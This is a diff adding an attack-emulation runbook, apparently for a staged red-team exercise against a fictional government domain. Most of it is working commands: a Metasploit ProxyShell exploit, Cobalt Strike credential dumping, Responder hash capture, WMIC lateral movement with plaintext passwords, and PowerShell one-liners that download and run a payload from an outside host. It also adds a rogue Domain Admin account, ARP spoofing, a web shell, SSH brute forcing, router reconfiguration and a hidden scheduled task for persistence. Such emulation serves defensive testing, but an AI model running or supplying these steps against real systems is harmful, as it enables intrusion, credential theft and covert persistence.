@@ -1,0 +1,108 @@
+Initial Access
+-	Udg-kali-1 terminal
+msfconsole
+msf> use exploit/windows/http/exchange_proxyshell_rce
+msf> set RHOSTS 151.102.64.6
+msf> set EMAIL Administrator@di.gov.gk
+msf> set payload windows/x64/meterpreter/bind_tcp
+## 3.3.10 Initial Access capture start 
+msf> run
+meterpreter > cd C:\\Users\\Administrator\\Documents
+meterpreter > upload /home/user/Desktop/AWSAuthService.exe C:\\Users\\Administrator\\Documents\\AWSAuthService.exe
+meterpreter > execute -f “C:\\Users\\Administrator\\Documents\\AWSAuthService.exe”
+meterpreter > exit
+## 3.3.10 Initial Access capture stop
+Discovery
+-	Udg-kali-1 terminal in cobalt strike ui
+## 3.3.11(situational awareness) capture starts 
+o	Interact with DI-EX beacon
+shell ipconfig /all
+logonpasswords
+net domain_controllers
+## 3.3.11(situational awareness) capture stop
+-	Rogue Kali Machine with Reverse SSH setup is used for internal attacker tools.
+-	Udg-kali-1 terminal
+Ssh -p 2222 Administrator@localhost
+## 3.3.5 mitm capture start 
+Sudo ~/Responder/Responder.py -I ens33 -Pv
+•	Runs until fannie.sparks hash is shown
+## 3.3.5 mitm capture stop
+Lateral Movement
+## 3.3.11(Lateral Movement) capture start
+-	Udg-kali-1 terminal in cobalt strike ui
+o	Interact with DI-EX beacon
+Shell wmic /node:”151.102.64.5”  /user:”DI\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
+o	Interact with DI-DC beacon
+logonpasswords
+net computers
+Shell wmic /node:”151.102.65.144”  /user:”DI\rodrigo.allison” /password:”r4#Sw5GyL+5V” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
+Shell wmic /node:”151.102.65.142”  /user:”DI\shelia.serrano” /password:”xI#Yp6@4#8o#” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
+Shell wmic /node:”151.102.65.57”  /user:”DI\eduardo.wheeler” /password:”bL+6oA6P@W+x” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
+Shell wmic /node:”151.102.64.8”  /user:”DI\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
+## 3.3.11(Lateral Movement) capture stop
+ssh -p 2222 Administrator@localhost
+sudo nmap -sV -O 151.102.65.143
+## 3.3.11 Mounted Shares Capture Start
+ssh fannie.sparks@151.102.65.143
+net use S: \\31.148.54.96\Share
+copy S:\* C:\Windows\System32\
+## 3.3.11 Mounted Shares Capture Stop
+## 3.3.7 & 3.3.8 DNS Beacon Capture Start
+C:\Windows\System32\SymantecSysMonitor.exe
+	In sliver beacon
+sliver > use
+sliver > cd C:\\Users\\fannie.sparks\\Documents
+sliver > ls
+sliver > download GK_DEFINTEL_ProjectHelios_TechOverview.docx
+
+## 3.3.7 & 3.3.8 DNS Beacon Capture Stop (let run for a while to show max beacons)
+	Back in ssh session
+nltest /DCLIST:DI
+nslookup di-dc.di.gov.gk
+-	New UDG-kali-1 terminal
+Ssh -p 2222 Administrator@localhost
+Ssh fannie.sparks@151.102.64.5
+powershell
+New-ADUser -Name "Oliver Jones" -GivenName "Oliver" -Surname "Jones" -SamAccountName "oliver.jones" -UserPrincipalName "oliver.jones@di.gov.gk" -AccountPassword (ConvertTo-SecureString "1R34llyL0v3P1zz4!" -AsPlainText -Force) -Enabled $true
+Add-ADGroupMember -Identity "Domain Admins" -Members "oliver.jones"
+exit
+exit
+
+## 3.3.6 Arp Spoofing Capture Start
+cd ~/Arp-Spoofer
+sudo -E ./arpspoofer.py -i ens33 -f 151.102.65.1
+y
+	( to see traffic create another ssh session and use tcpdump)
+## 3.3.6 Arp Spoofing Capture Stop (let run a while)
+Persistence
+## 3.3.12 (Persistence) Capture Start
+-	Udg-kali-1 terminal in cobalt strike ui
+o	Interact with DI-WEB beacon
+cd C:\inetpub\wwwroot\aspnet_client
+upload /home/user/util.aspx
+(The web shell can be interacted with by using browser urls such as “151.102.64.8/aspnet_client/util.aspx?cmd=%22net%20localgroup%20administrators%22” )
+## 3.3.11 (Persistence) Capture Stop
+## 3.3.14 open port capture start
+-	Udg-kali-1 terminal in cobalt strike ui
+o	Interact with DI-W10-3 beacon
+rportfwd 443 31.148.54.96 6666
+## 3.3.14 open port capture stop
+Network Device Attack
+-	Udg-kali-1
+o	In terminal
+cd /home/user/sshbrutesim
+python3 -m http.server 8080
+o	Interact with DI-W11-5 beacon
+upload /home/user/run_brute.ps1
+shell powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File run_brute.ps1
+o	 Interact with DI-W10-5  beacon
+Socks 9050 socks5
+o	In UDG Kali 1 Terminal
+proxychains ssh cisco@151.102.65.1 (need to check proxychains4.conf)
+conf t
+ip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443
+end
+Anomalous Malicious Activity
+Upload clrhost.ps1 to DI-W10-3, DI-W10-5, and DI-W11-5 using CS:
+Upload /home/user/clrhost.ps1
+Shell schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\system32\clrhost.ps1" /sc onlogon /rl HIGHEST
